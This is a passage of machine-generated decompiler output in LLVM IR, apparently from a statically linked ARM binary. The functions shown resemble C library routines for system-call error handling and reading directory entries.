  %v3_1560c = or i1 %tmp8, %v2_1560c
  br i1 %v3_1560c, label %.thread, label %dec_label_pc_15610

dec_label_pc_15610:                               ; preds = %dec_label_pc_155fc
  %v0_15610 = load i32, i32* %ip.global-to-local, align 4
  %v1_15614 = load i32, i32* %r4.global-to-local, align 4
  %v2_15614 = add i32 %v1_15614, 12
  %v3_15614 = inttoptr i32 %v2_15614 to i32*
  store i32 0, i32* %v3_15614, align 4
  %v1_15618 = load i32, i32* %r4.global-to-local, align 4
  %v2_15618 = add i32 %v1_15618, 16
  %v3_15618 = inttoptr i32 %v2_15618 to i32*
  store i32 0, i32* %v3_15618, align 4
  %tmp9 = icmp ult i32 %v0_15610, 7
  br i1 %tmp9, label %.thread, label %dec_label_pc_15620

dec_label_pc_15620:                               ; preds = %dec_label_pc_15610
  %v0_15620 = load i32, i32* %ip.global-to-local, align 4
  %v7_15620 = icmp eq i32 %v0_15620, 9
  %v1_15624 = load i32, i32* %r4.global-to-local, align 4
  %v2_15624 = add i32 %v1_15624, 20
  %v3_15624 = inttoptr i32 %v2_15624 to i32*
  store i32 0, i32* %v3_15624, align 4
  %v1_15628 = load i32, i32* %r4.global-to-local, align 4
  %v2_15628 = add i32 %v1_15628, 24
  %v3_15628 = inttoptr i32 %v2_15628 to i32*
  store i32 0, i32* %v3_15628, align 4
  br i1 %v7_15620, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_15620
  %v2_1562c = load i32, i32* %r4.global-to-local, align 4
  %v3_1562c = add i32 %v2_1562c, 32
  %v4_1562c = inttoptr i32 %v3_1562c to i32*
  store i32 0, i32* %v4_1562c, align 4
  %v2_15630 = load i32, i32* %r4.global-to-local, align 4
  %v3_15630 = add i32 %v2_15630, 28
  %v4_15630 = inttoptr i32 %v3_15630 to i32*
  store i32 0, i32* %v4_15630, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_15620, %dec_label_pc_155d4, %dec_label_pc_15610, %dec_label_pc_155fc, %dec_label_pc_15588, %dec_label_pc_155f4, %bb
  %v0_15640 = load i32, i32* @r5, align 4
  %v2_15640 = add i32 %v0_15640, 24
  %v3_15640 = inttoptr i32 %v2_15640 to i32*
  %v4_15640 = load i32, i32* %v3_15640, align 4
  store i32 %v4_15640, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v4_15640)
  br label %dec_label_pc_1564c

dec_label_pc_1564c:                               ; preds = %dec_label_pc_15574, %.thread
  %v0_1564c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v3_15540, i32* @r4, align 4
  store i32 %v6_15540, i32* @r5, align 4
  store i32 %v9_15540, i32* @r6, align 4
  store i32 %v12_15540, i32* @lr, align 4
  ret i32 %v0_1564c

; uselistorder directives
  uselistorder i32 %v1_155e4, { 0, 5, 1, 4, 3, 2 }
  uselistorder i32 %v1_155c8, { 0, 2, 1, 3, 4 }
  uselistorder i32* %r4.global-to-local, { 9, 0, 1, 2, 3, 4, 5, 6, 7, 8, 10 }
  uselistorder i32 13, { 0, 3, 4, 5, 1, 6, 2 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1564c, { 1, 0 }
  uselistorder label %.thread, { 6, 0, 2, 3, 5, 1, 4 }
}

define i32 @function_15660(i32 %arg1) local_unnamed_addr {
dec_label_pc_15660:
  %v0_15660 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_15660, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_15660
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_15660, %bb
  %v10_15670 = phi i32 [ %arg1, %dec_label_pc_15660 ], [ 0, %bb ]
  ret i32 %v10_15670

; uselistorder directives
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @function_15674(i32 %arg1) local_unnamed_addr {
dec_label_pc_15674:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_d7f0.639 to i32), i32 87684), i32* %r2.global-to-local, align 4
  %v4_15680 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_d7f0.639 to i32), i32 87788) to i32*), align 4
  %v4_15688 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_d7f0.639 to i32), i32 87752) to i32*), align 4
  store i32 %v4_15688, i32* %r1.global-to-local, align 4
  %v1_1568c = add i32 %arg1, 44
  %v2_1568c = inttoptr i32 %v1_1568c to i32*
  %v3_1568c = load i32, i32* %v2_1568c, align 4
  %v1_15690 = add i32 %arg1, 28
  %v2_15690 = inttoptr i32 %v1_15690 to i32*
  %v3_15690 = load i32, i32* %v2_15690, align 4
  store i32 %v3_15690, i32* %r2.global-to-local, align 4
  %v2_15694 = inttoptr i32 %v4_15680 to i32*
  store i32 %v3_1568c, i32* %v2_15694, align 4
  %v0_15698 = load i32, i32* %r2.global-to-local, align 4
  %v1_15698 = load i32, i32* %r1.global-to-local, align 4
  %v2_15698 = inttoptr i32 %v1_15698 to i32*
  store i32 %v0_15698, i32* %v2_15698, align 4
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %arg1, { 0, 2, 1 }
}

define i32 @function_156a4(i32 %arg1) local_unnamed_addr {
dec_label_pc_156a4:
  %v0_156a4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_156a4, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_156a4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_156a4, %bb
  %v4_156a8 = phi i32 [ %arg1, %dec_label_pc_156a4 ], [ 0, %bb ]
  ret i32 %v4_156a8

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_156ac(i32 %arg1) local_unnamed_addr {
dec_label_pc_156e8:
  store i32 %arg1, i32* @global_var_25874.574, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32* @global_var_25874.574, { 1, 0, 2 }
}

define i32 @function_156f8() local_unnamed_addr {
dec_label_pc_156f8:
  %stack_var_-8 = alloca i32, align 4
  %v3_156f8 = load i32, i32* @r4, align 4
  store i32 %v3_156f8, i32* %stack_var_-8, align 4
  %v0_156fc = load i32, i32* @r0, align 4
  %v0_15700 = call i32 @function_d0ec()
  %v1_15704 = sub i32 0, %v0_156fc
  %v2_15708 = inttoptr i32 %v0_15700 to i32*
  store i32 %v1_15704, i32* %v2_15708, align 4
  %v2_15710 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_15710, i32* @r4, align 4
  ret i32 -1
}

define i32 @function_15724(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_15724:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_15724 = load i32, i32* @r7, align 4
  store i32 %v3_15724, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_1574c, label %dec_label_pc_1573c

dec_label_pc_1573c:                               ; preds = %dec_label_pc_15724
  %v0_1573c = call i32 @function_d0ec()
  %v0_15740 = load i32, i32* %r7.global-to-local, align 4
  %v1_15740 = sub i32 0, %v0_15740
  %v2_15744 = inttoptr i32 %v0_1573c to i32*
  store i32 %v1_15740, i32* %v2_15744, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_15750.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_1574c

dec_label_pc_1574c:                               ; preds = %dec_label_pc_15724, %dec_label_pc_1573c
  %v2_15750 = phi i32 [ %v3_15724, %dec_label_pc_15724 ], [ %v2_15750.pre, %dec_label_pc_1573c ]
  %v0_1574c = phi i32 [ %arg1, %dec_label_pc_15724 ], [ -1, %dec_label_pc_1573c ]
  store i32 %v2_15750, i32* %r7.global-to-local, align 4
  ret i32 %v0_1574c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1574c, { 1, 0 }
}

define i32 @function_15758() local_unnamed_addr {
dec_label_pc_15758:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %tmp = call i16 @__decompiler_undefined_function_2()
  %tmp4 = call i16 @__decompiler_undefined_function_2()
  %tmp5 = call i16 @__decompiler_undefined_function_2()
  %tmp6 = call i16 @__decompiler_undefined_function_2()
  %tmp28 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-72 = alloca i32, align 4
  %v3_15758 = load i32, i32* @r7, align 4
  %v6_15758 = load i32, i32* @lr, align 4
  %v2_1575c = ptrtoint i32* %stack_var_-72 to i32
  %v0_15760 = load i32, i32* @r1, align 4
  store i32 %v0_15760, i32* @r3, align 4
  store i32 %v2_1575c, i32* %r1.global-to-local, align 4
  %v0_15770 = load i32, i32* @r0, align 4
  store i32 %v0_15770, i32* %r7.global-to-local, align 4
  %tmp32 = icmp ult i32 %v0_15770, -4095
  br i1 %tmp32, label %dec_label_pc_15790, label %dec_label_pc_1577c

dec_label_pc_1577c:                               ; preds = %dec_label_pc_15758
  %v0_1577c = call i32 @function_d0ec()
  %v0_15780 = load i32, i32* %r7.global-to-local, align 4
  %v1_15780 = sub i32 0, %v0_15780
  store i32 %v1_15780, i32* @r3, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_15788 = inttoptr i32 %v0_1577c to i32*
  store i32 %v1_15780, i32* %v2_15788, align 4
  %v0_157a0.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_157a0

dec_label_pc_15790:                               ; preds = %dec_label_pc_15758
  %v2_15790 = icmp eq i32 %v0_15770, 0
  store i32 87968, i32* %lr.global-to-local, align 4
  br i1 %v2_15790, label %dec_label_pc_15928, label %dec_label_pc_157a0

dec_label_pc_157a0:                               ; preds = %dec_label_pc_15790, %dec_label_pc_1577c
  %v0_157a0 = phi i32 [ %v0_157a0.pre, %dec_label_pc_1577c ], [ %v0_15770, %dec_label_pc_15790 ]
  store i32 %v3_15758, i32* @r7, align 4
  store i32 %v6_15758, i32* @lr, align 4
  ret i32 %v0_157a0

dec_label_pc_15928:                               ; preds = %dec_label_pc_15790
  %v3_15928 = load i32, i32* @r4, align 4
  %v6_15928 = load i32, i32* @r5, align 4
  %v9_15928 = load i32, i32* @r6, align 4
  %v15_15928 = load i32, i32* @r8, align 4
  %v18_15928 = load i32, i32* @sb, align 4
  store i32 %v0_15760, i32* %r5.global-to-local, align 4
  store i32 %v2_1575c, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 88, i32* @r2, align 4
  %v2_15944 = inttoptr i32 %v0_15760 to i8*
  %v3_15944 = call i32 @function_f5d0(i8* %v2_15944, i32 0)
  %v2_1594c = load i32, i32* %stack_var_-72, align 4
  store i32 %v2_1594c, i32* %r8.global-to-local, align 4
  %v1_15950 = load i32, i32* %r5.global-to-local, align 4
  %v2_15950 = add i32 %v1_15950, 12
  %v3_15950 = inttoptr i32 %v2_15950 to i32*
  %v1_1595c = load i32, i32* %r5.global-to-local, align 4
  %v2_1595c = add i32 %v1_1595c, 44
  %v3_1595c = inttoptr i32 %v2_1595c to i32*
  %v1_15964 = load i32, i32* %r5.global-to-local, align 4
  %v2_15964 = add i32 %v1_15964, 48
  %v3_15964 = inttoptr i32 %v2_15964 to i32*
  %v1_1596c = load i32, i32* %r5.global-to-local, align 4
  %v2_1596c = add i32 %v1_1596c, 52
  %v3_1596c = inttoptr i32 %v2_1596c to i32*
  %v0_15978 = load i32, i32* %r5.global-to-local, align 4
  %v1_15978 = add i32 %v0_15978, 56
  %v1_1597c = inttoptr i32 %v1_15978 to i32*
  %v3_1597c = add i32 %v0_15978, 60
  %v4_1597c = inttoptr i32 %v3_1597c to i32*
  %v5_1597c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1597c, i32* %v4_1597c, align 4
  %v0_15988 = load i32, i32* %r5.global-to-local, align 4
  %v1_15988 = add i32 %v0_15988, 64
  %v1_1598c = inttoptr i32 %v1_15988 to i32*
  %v3_1598c = add i32 %v0_15988, 68
  %v4_1598c = inttoptr i32 %v3_1598c to i32*
  %v5_1598c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1598c, i32* %v4_1598c, align 4
  %v4_15998 = zext i16 %tmp6 to i32
  store i32 %v4_15998, i32* %r2.global-to-local, align 4
  %v4_1599c = zext i16 %tmp5 to i32
  store i32 %v4_1599c, i32* %ip.global-to-local, align 4
  %v4_159a0 = zext i16 %tmp4 to i32
  store i32 %v4_159a0, i32* %lr.global-to-local, align 4
  %v4_159a4 = zext i16 %tmp to i32
  store i32 %v4_159a4, i32* %r4.global-to-local, align 4
  store i32 0, i32* %sb.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  %v0_159b0 = load i32, i32* %r5.global-to-local, align 4
  %v1_159b0 = add i32 %v0_159b0, 72
  store i32 %v1_159b0, i32* @r3, align 4
  %v1_159b4 = inttoptr i32 %v1_159b0 to i32*
  store i32 %tmp28, i32* %v1_159b4, align 4
  %v3_159b4 = add i32 %v0_159b0, 76
  %v4_159b4 = inttoptr i32 %v3_159b4 to i32*
  %v5_159b4 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_159b4, i32* %v4_159b4, align 4
  %v0_159b8 = load i32, i32* %r5.global-to-local, align 4
  %v1_159b8 = inttoptr i32 %v0_159b8 to i32*
  %v2_159b8 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v2_159b8, i32* %v1_159b8, align 4
  %v3_159b8 = add i32 %v0_159b8, 4
  %v4_159b8 = inttoptr i32 %v3_159b8 to i32*
  %v5_159b8 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v5_159b8, i32* %v4_159b8, align 4
  %v0_159bc = load i32, i32* %r6.global-to-local, align 4
  %v1_159bc = load i32, i32* %r5.global-to-local, align 4
  %v2_159bc = add i32 %v1_159bc, 32
  %v3_159bc = inttoptr i32 %v2_159bc to i32*
  store i32 %v0_159bc, i32* %v3_159bc, align 4
  %v0_159c0 = load i32, i32* %r7.global-to-local, align 4
  %v1_159c0 = load i32, i32* %r5.global-to-local, align 4
  %v2_159c0 = add i32 %v1_159c0, 36
  %v3_159c0 = inttoptr i32 %v2_159c0 to i32*
  store i32 %v0_159c0, i32* %v3_159c0, align 4
  %v0_159c4 = load i32, i32* %r2.global-to-local, align 4
  %v1_159c4 = load i32, i32* %r5.global-to-local, align 4
  %v2_159c4 = add i32 %v1_159c4, 16
  %v3_159c4 = inttoptr i32 %v2_159c4 to i32*
  store i32 %v0_159c4, i32* %v3_159c4, align 4
  %v0_159c8 = load i32, i32* %ip.global-to-local, align 4
  %v1_159c8 = load i32, i32* %r5.global-to-local, align 4
  %v2_159c8 = add i32 %v1_159c8, 20
  %v3_159c8 = inttoptr i32 %v2_159c8 to i32*
  store i32 %v0_159c8, i32* %v3_159c8, align 4
  %v0_159cc = load i32, i32* %lr.global-to-local, align 4
  %v1_159cc = load i32, i32* %r5.global-to-local, align 4
  %v2_159cc = add i32 %v1_159cc, 24
  %v3_159cc = inttoptr i32 %v2_159cc to i32*
  store i32 %v0_159cc, i32* %v3_159cc, align 4
  %v0_159d0 = load i32, i32* %r4.global-to-local, align 4
  %v1_159d0 = load i32, i32* %r5.global-to-local, align 4
  %v2_159d0 = add i32 %v1_159d0, 28
  %v3_159d0 = inttoptr i32 %v2_159d0 to i32*
  store i32 %v0_159d0, i32* %v3_159d0, align 4
  store i32 %v3_15928, i32* @r4, align 4
  store i32 %v6_15928, i32* @r5, align 4
  store i32 %v9_15928, i32* @r6, align 4
  store i32 0, i32* @r7, align 4
  store i32 %v15_15928, i32* @r8, align 4
  store i32 %v18_15928, i32* @sb, align 4
  store i32 87968, i32* @lr, align 4
  ret i32 %tmp28

; uselistorder directives
  uselistorder i32 %v0_15770, { 1, 2, 0, 3 }
  uselistorder i32 %v0_15760, { 1, 0, 2 }
  uselistorder i32 %tmp28, { 1, 0 }
  uselistorder i32* %r7.global-to-local, { 4, 5, 0, 1, 2, 3 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %lr.global-to-local, { 1, 2, 0 }
  uselistorder i32 72, { 4, 0, 1, 7, 2, 3, 5, 6 }
  uselistorder i32 60, { 3, 4, 0, 5, 6, 1, 2, 7 }
}

define i32 @function_159e0(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_159e0:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %stack_var_-72 = alloca i32, align 4
  %v3_159e4 = load i32, i32* @r4, align 4
  %v6_159e4 = load i32, i32* @r5, align 4
  %v12_159e4 = load i32, i32* @r7, align 4
  %v1_159e8 = add i32 %arg3, 14
  %v2_159f0 = ptrtoint i32* %stack_var_-72 to i32
  %v1_159f4 = and i32 %v1_159e8, -8
  %v2_159f8 = sub i32 %v2_159f0, %v1_159f4
  %v1_159fc = add i32 %v2_159f8, 8
  store i32 %tmp, i32* %r6.global-to-local, align 4
  store i32 %tmp, i32* @r5, align 4
  store i32 %v1_159fc, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp25 = icmp ult i32 %arg1, -4095
  br i1 %tmp25, label %dec_label_pc_15a38, label %dec_label_pc_15a24

dec_label_pc_15a24:                               ; preds = %dec_label_pc_159e0
  %v0_15a24 = call i32 @function_d0ec()
  %v0_15a28 = load i32, i32* %r4.global-to-local, align 4
  %v1_15a28 = sub i32 0, %v0_15a28
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_15a30 = inttoptr i32 %v0_15a24 to i32*
  store i32 %v1_15a28, i32* %v2_15a30, align 4
  %v0_15a40.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_15a40

dec_label_pc_15a38:                               ; preds = %dec_label_pc_159e0
  br i1 false, label %dec_label_pc_15a40, label %dec_label_pc_15a48

dec_label_pc_15a40:                               ; preds = %dec_label_pc_15a38, %dec_label_pc_15a24
  %v0_15a40 = phi i32 [ -1, %dec_label_pc_15a38 ], [ %v0_15a40.pre, %dec_label_pc_15a24 ]
  store i32 %v0_15a40, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_15b14

dec_label_pc_15a48:                               ; preds = %dec_label_pc_15a38
  %v2_15a48 = add i32 %v1_159fc, %arg1
  %v2_15a4c = add i32 %tmp, %arg3
  store i32 %v2_15a4c, i32* @ip, align 4
  store i32 %v1_159fc, i32* @r7, align 4
  store i32 -1, i32* %sb.global-to-local, align 4
  store i32 -1, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_15afc

dec_label_pc_15a68:                               ; preds = %dec_label_pc_15afc
  %v1_15a68 = add i32 %v0_15abc, 16
  %v2_15a68 = inttoptr i32 %v1_15a68 to i16*
  %v3_15a68 = load i16, i16* %v2_15a68, align 2
  %v4_15a68 = zext i16 %v3_15a68 to i32
  %v1_15a6c = add nuw nsw i32 %v4_15a68, 7
  %v1_15a70 = and i32 %v1_15a6c, 131064
  store i32 %v1_15a70, i32* %r2.global-to-local, align 4
  %v2_15a78 = add i32 %v1_15a70, %v0_15ac4
  store i32 %v2_15a78, i32* %r8.global-to-local, align 4
  %tmp26 = icmp ugt i32 %v2_15a78, %v2_15a4c
  br i1 %tmp26, label %dec_label_pc_15a84, label %dec_label_pc_15ab8

dec_label_pc_15a84:                               ; preds = %dec_label_pc_15a68
  store i32 0, i32* %r1.global-to-local, align 4
  %v0_15a8c = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_15a8c, i32* %r2.global-to-local, align 4
  %v0_15a90 = load i32, i32* %sl.global-to-local, align 4
  %v1_15a94 = load i32, i32* @sp, align 4
  %v2_15a94 = inttoptr i32 %v1_15a94 to i32*
  store i32 0, i32* %v2_15a94, align 4
  %v4_15a98 = call i32 @function_178a0(i32 %arg1, i32 0, i32 %v0_15a8c, i32 %v0_15a90)
  %v0_15a9c = load i32, i32* @r5, align 4
  %v1_15a9c = load i32, i32* %r6.global-to-local, align 4
  %v9_15a9c = icmp eq i32 %v0_15a9c, %v1_15a9c
  br i1 %v9_15a9c, label %dec_label_pc_15aa4, label %dec_label_pc_15b10

dec_label_pc_15aa4:                               ; preds = %dec_label_pc_15a84
  %v0_15aa4 = call i32 @function_d0ec()
  store i32 -1, i32* %r1.global-to-local, align 4
  %v2_15ab0 = inttoptr i32 %v0_15aa4 to i32*
  store i32 22, i32* %v2_15ab0, align 4
  %v0_15b14.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_15b14

dec_label_pc_15ab8:                               ; preds = %dec_label_pc_15a68
  %v1_15ab8 = inttoptr i32 %v0_15abc to i32*
  %v2_15ab8 = load i32, i32* %v1_15ab8, align 4
  %v3_15ab8 = add i32 %v0_15abc, 4
  %v4_15ab8 = inttoptr i32 %v3_15ab8 to i32*
  %v5_15ab8 = load i32, i32* %v4_15ab8, align 4
  store i32 %v5_15ab8, i32* %r4.global-to-local, align 4
  %v1_15abc = add i32 %v0_15abc, 8
  store i32 %v1_15abc, i32* %sb.global-to-local, align 4
  %v1_15ac0 = inttoptr i32 %v1_15abc to i32*
  %v2_15ac0 = load i32, i32* %v1_15ac0, align 4
  store i32 %v2_15ac0, i32* %sb.global-to-local, align 4
  %v3_15ac0 = add i32 %v0_15abc, 12
  %v4_15ac0 = inttoptr i32 %v3_15ac0 to i32*
  %v5_15ac0 = load i32, i32* %v4_15ac0, align 4
  store i32 %v5_15ac0, i32* %sl.global-to-local, align 4
  %v1_15ac4 = inttoptr i32 %v0_15ac4 to i32*
  store i32 %v2_15ab8, i32* %v1_15ac4, align 4
  %v3_15ac4 = add i32 %v0_15ac4, 4
  %v4_15ac4 = inttoptr i32 %v3_15ac4 to i32*
  %v5_15ac4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_15ac4, i32* %v4_15ac4, align 4
  %v0_15ac8 = load i32, i32* @r7, align 4
  %v1_15ac8 = add i32 %v0_15ac8, 8
  %v1_15acc = inttoptr i32 %v1_15ac8 to i32*
  %v2_15acc = load i32, i32* %v1_15acc, align 4
  %v3_15acc = add i32 %v0_15ac8, 12
  %v4_15acc = inttoptr i32 %v3_15acc to i32*
  %v5_15acc = load i32, i32* %v4_15acc, align 4
  store i32 %v5_15acc, i32* @r4, align 4
  %v1_15ad0 = load i32, i32* @r5, align 4
  %v2_15ad0 = add i32 %v1_15ad0, 8
  %v3_15ad0 = inttoptr i32 %v2_15ad0 to i32*
  store i32 %v2_15acc, i32* %v3_15ad0, align 4
  %v0_15ad4 = load i32, i32* @r4, align 4
  %v1_15ad4 = load i32, i32* @r5, align 4
  %v2_15ad4 = add i32 %v1_15ad4, 12
  %v3_15ad4 = inttoptr i32 %v2_15ad4 to i32*
  store i32 %v0_15ad4, i32* %v3_15ad4, align 4
  %v0_15ad8 = load i32, i32* %r2.global-to-local, align 4
  %v1_15ad8 = trunc i32 %v0_15ad8 to i16
  %v2_15ad8 = load i32, i32* @r5, align 4
  %v3_15ad8 = add i32 %v2_15ad8, 16
  %v4_15ad8 = inttoptr i32 %v3_15ad8 to i16*
  store i16 %v1_15ad8, i16* %v4_15ad8, align 2
  %v0_15adc = load i32, i32* @r7, align 4
  %v1_15adc = add i32 %v0_15adc, 18
  %v2_15adc = inttoptr i32 %v1_15adc to i8*
  %v3_15adc = load i8, i8* %v2_15adc, align 1
  %v4_15adc = zext i8 %v3_15adc to i32
  store i32 %v4_15adc, i32* @r3, align 4
  %v2_15ae0 = load i32, i32* @r5, align 4
  %v3_15ae0 = add i32 %v2_15ae0, 18
  %v4_15ae0 = inttoptr i32 %v3_15ae0 to i8*
  store i8 %v3_15adc, i8* %v4_15ae0, align 1
  %v0_15ae4 = load i32, i32* @r7, align 4
  %v1_15ae4 = add i32 %v0_15ae4, 16
  %v2_15ae4 = inttoptr i32 %v1_15ae4 to i16*
  %v3_15ae4 = load i16, i16* %v2_15ae4, align 2
  %v4_15ae4 = zext i16 %v3_15ae4 to i32
  %v1_15ae8 = add nsw i32 %v4_15ae4, -19
  store i32 %v1_15ae8, i32* @r2, align 4
  %v0_15aec = call i32 @function_f700()
  %v0_15af0 = load i32, i32* @r7, align 4
  %v1_15af0 = add i32 %v0_15af0, 16
  %v2_15af0 = inttoptr i32 %v1_15af0 to i16*
  %v3_15af0 = load i16, i16* %v2_15af0, align 2
  %v4_15af0 = zext i16 %v3_15af0 to i32
  %v0_15af4 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_15af4, i32* @r5, align 4
  %v2_15af8 = add i32 %v4_15af0, %v0_15af0
  store i32 %v2_15af8, i32* @r7, align 4
  br label %dec_label_pc_15afc

dec_label_pc_15afc:                               ; preds = %dec_label_pc_15a48, %dec_label_pc_15ab8
  %v0_15ac4 = phi i32 [ %tmp, %dec_label_pc_15a48 ], [ %v0_15af4, %dec_label_pc_15ab8 ]
  %v0_15abc = phi i32 [ %v1_159fc, %dec_label_pc_15a48 ], [ %v2_15af8, %dec_label_pc_15ab8 ]
  %v3_15b00 = icmp ult i32 %v0_15abc, %v2_15a48
  %v1_15b04 = add i32 %v0_15ac4, 19
  store i32 %v1_15b04, i32* @r0, align 4
  %v1_15b08 = add i32 %v0_15abc, 19
  store i32 %v1_15b08, i32* @r1, align 4
  br i1 %v3_15b00, label %dec_label_pc_15a68, label %dec_label_pc_15b10.loopexit

dec_label_pc_15b10.loopexit:                      ; preds = %dec_label_pc_15afc
  %v0_15b10.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_15b10

dec_label_pc_15b10:                               ; preds = %dec_label_pc_15b10.loopexit, %dec_label_pc_15a84
  %v1_15b10 = phi i32 [ %v0_15ac4, %dec_label_pc_15b10.loopexit ], [ %v0_15a9c, %dec_label_pc_15a84 ]
  %v0_15b10 = phi i32 [ %v0_15b10.pre, %dec_label_pc_15b10.loopexit ], [ %v1_15a9c, %dec_label_pc_15a84 ]
  %v2_15b10 = sub i32 %v1_15b10, %v0_15b10
  store i32 %v2_15b10, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_15b14

dec_label_pc_15b14:                               ; preds = %dec_label_pc_15aa4, %dec_label_pc_15a40, %dec_label_pc_15b10
  %v0_15b14 = phi i32 [ %v0_15b14.pre, %dec_label_pc_15aa4 ], [ %v0_15a40, %dec_label_pc_15a40 ], [ %v2_15b10, %dec_label_pc_15b10 ]
  store i32 %v3_159e4, i32* %r4.global-to-local, align 4
  store i32 %v6_159e4, i32* @r5, align 4
  store i32 %v12_159e4, i32* @r7, align 4
  ret i32 %v0_15b14

; uselistorder directives
  uselistorder i32 %v0_15abc, { 5, 6, 4, 2, 3, 0, 1 }
  uselistorder i32 %v0_15ac4, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v1_159fc, { 1, 2, 0, 3 }
  uselistorder i32 %tmp, { 0, 1, 3, 2, 4 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r2.global-to-local, { 2, 1, 3, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 19, { 1, 2, 0, 3 }
  uselistorder i32 18, { 2, 3, 4, 0, 1 }
  uselistorder i32* @sp, { 0, 3, 2, 1 }
  uselistorder i32 14, { 3, 7, 4, 5, 0, 1, 2, 6 }
  uselistorder i32 %arg1, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_15b14, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15afc, { 1, 0 }
}

define i32 @function_15b24() local_unnamed_addr {
dec_label_pc_15b24:
  %v0_15b30 = load i32, i32* @r1, align 4
  store i32 %v0_15b30, i32* @r2, align 4
  %v0_15b38 = call i32 @function_15b48()
  ret i32 %v0_15b38
}

define i32 @function_15b48() local_unnamed_addr {
dec_label_pc_15b48:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp14 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-32 = alloca i32, align 4
  %v3_15b48 = load i32, i32* @r4, align 4
  %v6_15b48 = load i32, i32* @r5, align 4
  %v12_15b48 = load i32, i32* @r7, align 4
  store i32 %tmp14, i32* @r7, align 4
  %v0_15b5c = load i32, i32* @r2, align 4
  store i32 %v0_15b5c, i32* %stack_var_-32, align 4
  store i32 142964, i32* %r6.global-to-local, align 4
  %v0_15b68 = load i32, i32* @r0, align 4
  store i32 %v0_15b68, i32* @r5, align 4
  %tmp = icmp ult i32 %tmp14, 3
  br i1 %tmp, label %dec_label_pc_15b84, label %dec_label_pc_15b70

dec_label_pc_15b70:                               ; preds = %dec_label_pc_15b48
  %v0_15b70 = call i32 @function_d0ec()
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_15b7c = inttoptr i32 %v0_15b70 to i32*
  store i32 22, i32* %v2_15b7c, align 4
  br label %dec_label_pc_15c74

dec_label_pc_15b84:                               ; preds = %dec_label_pc_15b48
